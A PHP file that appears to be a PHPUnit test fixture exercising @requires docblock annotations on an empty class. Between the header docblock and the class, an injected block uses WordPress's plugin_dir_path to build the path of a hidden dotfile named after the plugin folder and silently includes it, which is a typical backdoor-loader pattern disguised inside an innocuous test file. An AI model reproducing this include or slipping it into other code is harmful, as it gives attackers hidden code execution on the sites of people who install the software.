<?php

/**
 * @requires PHP 5.3
 * @requires PHPUnit 4.0
 * @requires OS Linux
 * @requires function testFuncClass
 * @requires extension testExtClass
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RequirementsClassDocBlockTest
{
    /**
     * @requires PHP 5.4
     * @requires PHPUnit 3.7
     * @requires OS WINNT
     * @requires function testFuncMethod
     * @requires extension testExtMethod
     */
    public function testMethod()
    {
    }
}
